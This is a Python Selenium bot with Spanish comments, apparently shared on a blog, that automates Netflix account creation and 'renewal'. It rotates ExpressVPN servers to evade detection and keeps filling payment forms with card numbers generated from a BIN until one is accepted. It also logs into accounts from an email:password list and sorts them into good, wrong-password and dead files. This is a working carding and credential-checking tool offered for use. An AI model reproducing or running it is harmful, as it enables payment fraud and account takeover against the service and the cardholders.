#!/usr/bin/env Python 3.6
#Codigo by sRBill96 para netixzen.blogspot.com.ar
import os
import subprocess
from modulos.seleniumFork import SFork
from modulos.generador_datos import Generador_datos
from modulos.generador_tarjetas import Generar_tarjeta

class NetflixBot():
	def __init__(self):
		self.elementos_netflix = {
			#Nombres de elementos y alternativos (debido a la dinamica de la pagina en cada carga)
			"email":["email"],
			"password":["password"],
			"loginEmail":["userLoginId", "id_userLoginId"],
			"continue":["btn-submit","continue","btn continue btn-blue btn-large","btn","btn-blue"],
			"tarjeta":["container","paymentExpandoHd"],
			#tarjetadatos
			"firstName":["firstName"],
			"lastName":["lastName"],
			"expiration":["id_creditExpirationMonth"],
			"creditCardNumber":["creditCardNumber"],
			"creditZipcode":["creditZipcode"],
			"creditCardSecurityCode":["creditCardSecurityCode"],
			
		}
		self.netflix = {
			"perfiles":		"https://www.netflix.com/browse",
			"loginNetflix":	"https://www.netflix.com/login",
			"registro":"https://www.netflix.com/signup/registration",
			"plan":"https://www.netflix.com/signup/planform",
			"suscribirse":	"https://www.netflix.com/signup?action=startAction",
			"tarjeta":		"https://www.netflix.com/signup/creditoption",
			"renovacion":"https://www.netflix.com/signup",
			"confirmform":		"https://www.netflix.com/signup/confirmform",
			"payment":		"https://www.netflix.com/signup/payment",
			"editpaymentcontext":		"https://www.netflix.com/signup/editpaymentcontext",
			"paymentinfo":		"https://www.netflix.com/signup/paymentinfo",
			"paymentselection":		"https://www.netflix.com/signup/paymentselection",
			"editcredit":		"https://www.netflix.com/signup/editcredit",
			"retrycredit":		"https://www.netflix.com/simplemember/retrycredit",
			"renovacionexitosa":		"https://www.netflix.com/simplemember/retrycredit",
			"orderfinal":		"https://www.netflix.com/orderfinal",
		}
		self.datosUsuario = {}
		self.expressLista = [
			'usmi',
			'usmi2',
			'usta1',
			'usnj1',
			'usnj3',
			'usny',
			'usda',
			'ussf',
			'usch',
			'uswd',
			'usla3',
			'uswd2',
			'usla2',
			'usse',
			'usde',
			'ussl',
			'uskc',
			'usph',
			'usla1',
			'usvi',
			'usny2',
			'usnj2',
			'usho',
			'usda2',
			'usmi',
			'usbo',
			'usla',
			'ussj',
			'usat',
			'usla4',
			'ussf',
			'ussf2',
		]

		self.expressActual = 0

	def crear_cuenta(self, datos):
		f = open("datos/express_config.txt","r")
		self.expressActual = f.readlines()
		f.close()
		self.expressActual = int(self.expressActual[0].strip())

		if self.expressActual == len(self.expressLista)-1:
			self.expressActual = 0

		subprocess.call('expressvpn disconnect', shell=True)
		print("Desconectando VPN")
		subprocess.call('expressvpn connect {0}'.format(self.expressLista[self.expressActual]), shell=True)
		print("Conectando VPN {}".format(self.expressLista[self.expressActual]))
		
		nv = SFork()
		nv.IniciarDriver()
		nv.elementos = self.elementos_netflix
		self.datosUsuario = Generador_datos(datos).datos
		
		open("datos/log.txt","a+").writelines(str(self.datosUsuario)+"\n")
		print(self.datosUsuario)
		
		nv.Ir(self.netflix["suscribirse"])
	
		loginNetflix = {	
			"email":	self.datosUsuario["email"],
			"password":	self.datosUsuario["passw"]
		}
		
		#Pagina de creacion cuenta netflix
		print("Clickeando boton 1")
		nv.ClickearObjeto(".submitBtnContainer", "https://www.netflix.com/signup?action=startAction")
		nv.ClickearObjeto(".submitBtnContainer", "https://www.netflix.com/signup/planform")
		nv.ClickearObjeto(".submitBtnContainer", "https://www.netflix.com/signup/registration")
		nv.completarFormulario(loginNetflix)
		nv.ClickearObjeto(".submitBtnContainer", "https://www.netflix.com/signup/regform")
		repeatCard = 0
		while ((nv.driver.current_url == self.netflix["tarjeta"] or nv.driver.current_url == self.netflix["paymentselection"] or nv.driver.current_url == self.netflix["payment"]) and repeatCard < 10):
			# metodo = input("1)Bin Directo 2): Base Tarjeta")
			# if(metodo == "1"):
			self.datosUsuario = Generador_datos({"BIN":"xxxxxxxxxx", "base_tarjetas":2}).datos
			open("datos/log.txt","a+").writelines(str(self.datosUsuario)+"\n")

			binDirecto = {
				"firstName":				'name',
				"lastName":					'name',
				"creditCardNumber":			self.datosUsuario["tarjeta"]["numero"],
				"expiration":	self.datosUsuario["tarjeta"]["fecha"]["fecha_acortada"],
				"creditCardSecurityCode":	self.datosUsuario["tarjeta"]["codigo_seg"]	,
				"creditZipcode":			self.datosUsuario["postalCode"],
			}
			nv.Clickear(nv.Buscar("hasAcceptedTermsOfUse", tipo="name"))
			nv.Ir(self.netflix["tarjeta"])
			nv.completarFormulario(binDirecto)
			nv.Enter()
			repeatCard = repeatCard + 1
			# nv.Pausa(5)
			comand = input("#$ ")
		
		comand = input("#$ ")
    		
		self.expressActual = self.expressActual + 1
		e = open("datos/express_config.txt","w")
		e.write("{}".format(self.expressActual))
		e.close()
		
		#Consola de depuracion
		# while(1):
		# 	comand = input("#$ ")
		# 	try:
		# 		eval(comand)
		# 	except:
		# 		print("Error al ejecutar comando")
		# nv.Enter()
	
	def renovar_cuenta(self, datos=None):	
		f = open("datos/lista_renovacion.txt","r")
		lista_renovacion = f.readlines()
		f.close()

		for linea in lista_renovacion:
			validacion = True
			f = open("datos/express_config.txt","r")
			self.expressActual = f.readlines()
			f.close()
			self.expressActual = int(self.expressActual[0].strip())

			if self.expressActual == len(self.expressLista)-1:
				self.expressActual = 0
				e = open("datos/express_config.txt","w")
				e.write("{}".format(self.expressActual))
				e.close()

			subprocess.call('expressvpn disconnect', shell=True)
			print("Desconectando VPN")
			subprocess.call('expressvpn connect {0}'.format(self.expressLista[self.expressActual]), shell=True)
			print("Conectando VPN {}".format(self.expressLista[self.expressActual]))

			nv = SFork()
			nv.IniciarDriver()
			nv.elementos = self.elementos_netflix

			nv.Ir(self.netflix["loginNetflix"])

			lineaActual = linea.split(':')

			loginNetflix = {	
				"loginEmail":	lineaActual[0],
				"password":	lineaActual[1]
			}

			# print(loginNetflix)

			nv.completarFormulario(loginNetflix)
			# https://www.netflix.com/Welcome/OnRamp
			if self.netflix["renovacion"] in nv.driver.current_url:
				print("renovacion")
				nv.ClickearObjeto(".submitBtnContainer", self.netflix["renovacion"])
			# if self.netflix["confirmform"] in nv.driver.current_url:
			
			def confirmacion():

				if self.netflix["confirmform"] in nv.driver.current_url:
					nv.Clickear(nv.BuscarPor(".submitBtnContainer", "css"))
				else:
					return "Next"

				if not nv.verificarConfirmacionFail():
					confirmacion()
				else:
					return "Encontrado"

			if self.netflix["plan"] in nv.driver.current_url:
				print("plan")
				nv.ClickearObjeto(".submitBtnContainer", self.netflix["plan"])
			if self.netflix["paymentinfo"] in nv.driver.current_url:
				print("paymentinfo")
				nv.ClickearObjeto(".submitBtnContainer", self.netflix["paymentinfo"])
			if self.netflix["editpaymentcontext"] in nv.driver.current_url:
				print("editpaymentcontext")
				nv.ClickearObjeto(".submitBtnContainer", self.netflix["editpaymentcontext"])
			# comand = input("#While#01#$ ")
			if self.netflix["tarjeta"] in nv.driver.current_url or self.netflix["paymentselection"] in nv.driver.current_url or self.netflix["editcredit"] in nv.driver.current_url or self.netflix["confirmform"] in nv.driver.current_url:
				repeatCard = 0
				while((self.netflix["tarjeta"] in nv.driver.current_url or self.netflix["paymentselection"] in nv.driver.current_url or self.netflix["editcredit"] in nv.driver.current_url or self.netflix["confirmform"] in nv.driver.current_url)  and repeatCard < 10):
					print("")
					print(nv.driver.current_url)
					print("")
					if self.netflix["confirmform"] in nv.driver.current_url or self.netflix["confirmform"] == nv.driver.current_url:
						print("confirmform")
						confirmacion()
						if nv.verificarConfirmacionFail():
							nv.ClickearObjeto(".select-user", self.netflix["confirmform"])
							nv.Esperar(5)

					if not self.netflix["confirmform"] in nv.driver.current_url and not self.netflix["orderfinal"] in nv.driver.current_url:

						self.datosUsuario = Generador_datos({"BIN":"xxxxxxxxxxxxxxxx", "base_tarjetas":1}).datos
						open("datos/log.txt","a+").writelines(str(self.datosUsuario)+"\n")
						print(self.datosUsuario["tarjeta"]["dato_completo"])
						binDirecto = {
							"firstName":				'name',
							"lastName":					'name',
							"creditCardNumber":			self.datosUsuario["tarjeta"]["numero"],
							"creditExpirationMonth":	self.datosUsuario["tarjeta"]["fecha"]["fecha_acortada"],
							"creditCardSecurityCode":	self.datosUsuario["tarjeta"]["codigo_seg"],
							"creditZipcode":			self.datosUsuario["postalCode"],
						}
					
						if not self.netflix["editcredit"] in nv.driver.current_url and not self.netflix["orderfinal"] in nv.driver.current_url:
							nv.Clickear(nv.Buscar("hasAcceptedTermsOfUse", tipo="name"))
							nv.Ir(self.netflix["tarjeta"])
							nv.Esperar(5)

					if not self.netflix["orderfinal"] in nv.driver.current_url:
						nv.completarFormulario(binDirecto)
						nv.Enter()
						nv.Esperar(2)
					repeatCard = repeatCard + 1

			if self.netflix["orderfinal"] in nv.driver.current_url:	
				print("[+]Good")
				open("datos/cuentas_good.txt","a+").writelines(str(linea.strip())+"\n")
				s = open("datos/lista_renovacion.txt","w")
				for l in lista_renovacion:
					if l.strip() != linea.strip():
						s.write(l.strip()+"\n")
				s.close()

			# comand = input("#$ ")
			if self.netflix["loginNetflix"] in nv.driver.current_url:
				#  and nv.driver.current_url != self.netflix["perfiles"] and nv.driver.current_url != self.netflix["renovacion"] and nv.driver.current_url != self.netflix["plan"] and nv.driver.current_url != self.netflix["paymentinfo"]

				if nv.verificarErrorPassword():
					print("Incorrect password")
					validacion = False
					open("datos/cuentas_epassword.txt","a+").writelines(str(linea.strip())+"\n")
					s = open("datos/lista_renovacion.txt","w")
					for l in lista_renovacion:
						# print(l.strip(), linea.strip())
						if l.strip() != linea.strip():
							s.write(l.strip()+"\n")
					s.close()

				if nv.verificarErrorExists() and validacion:
					print("Account not exists")
					validacion = False
					open("datos/cuentas_dead.txt","a+").writelines(str(linea.strip())+"\n")
					s = open("datos/lista_renovacion.txt","w")
					for l in lista_renovacion:
						# print(l.strip(), linea.strip())
						if l.strip() != linea.strip():
							s.write(l.strip()+"\n")
					s.close()
			
			if validacion and self.netflix["perfiles"] in nv.driver.current_url:
				UrlNetflix = nv.verificarProfiles()
				if UrlNetflix != None:
					if '/SwitchProfile?' in UrlNetflix:
						nv.Ir(UrlNetflix)
						if nv.verificarPagoPerfil():
							nv.ClickearObjeto(".btn-bar", self.netflix["perfiles"])
							nv.Clickear(nv.Buscar("retry-payment", tipo="id"))
							if self.netflix["retrycredit"] in nv.driver.current_url:
        				
								while(self.netflix["tarjeta"] in nv.driver.current_url or self.netflix["paymentselection"] in nv.driver.current_url or self.netflix["retrycredit"] in nv.driver.current_url):
									# metodo = input("1)Bin Directo")
									# if(metodo == "1"):
									# ?locale=en-US
									self.datosUsuario = Generador_datos({"BIN":"xxxxxxxxxxxxxxxx", "base_tarjetas":1}).datos
									open("datos/log.txt","a+").writelines(str(self.datosUsuario)+"\n")
									print(self.datosUsuario["tarjeta"]["dato_completo"])
									binDirecto = {
										"firstName":				'name',
										"lastName":					'name',
										"creditCardNumber":			self.datosUsuario["tarjeta"]["numero"],
										"creditExpirationMonth":	self.datosUsuario["tarjeta"]["fecha"]["fecha_acortada"],
										"creditCardSecurityCode":	self.datosUsuario["tarjeta"]["codigo_seg"],
										"creditZipcode":			self.datosUsuario["postalCode"],
									}
									nv.Clickear(nv.Buscar("hasAcceptedTermsOfUse", tipo="name"))
									nv.completarFormulario(binDirecto)
									nv.Enter()
									nv.Esperar(5)
									# comand = input("#$ ")
									# s = open("modulos/db_cards.txt","w")
									# for l in lista_renovacion:
									# 	if l.strip() != linea.strip():
									# 		s.write(l.strip()+"\n")
									# 	else:
									# 		open("modulos/db_cards_dead.txt","a+").writelines(str(linea.strip())+"\n")
									# s.close()
						else:
							print("[+]Good")
							open("datos/cuentas_good.txt","a+").writelines(str(linea.strip())+"\n")
							s = open("datos/lista_renovacion.txt","w")
							for l in lista_renovacion:
								if l.strip() != linea.strip():
									s.write(l.strip()+"\n")
							s.close()
			# comand = input("#$ ")
			# comand = input("#$ ")
			self.expressActual = self.expressActual + 1
			e = open("datos/express_config.txt","w")
			e.write("{}".format(self.expressActual))
			e.close()

			nv.Salir()


#Inicio de creacion
metodo=True
while(metodo != '4'):
	metodo = input("1)Crear Netflix 2)Renovar Lista 2)Renovar Netflix 4)Salir >:_ ")
	if(metodo == "1"):
		botCrear = NetflixBot().crear_cuenta(datos)
	elif(metodo == "2"):
		botCrear = NetflixBot().renovar_cuenta()
	else:
		print("No se selecciono ninguna opcion")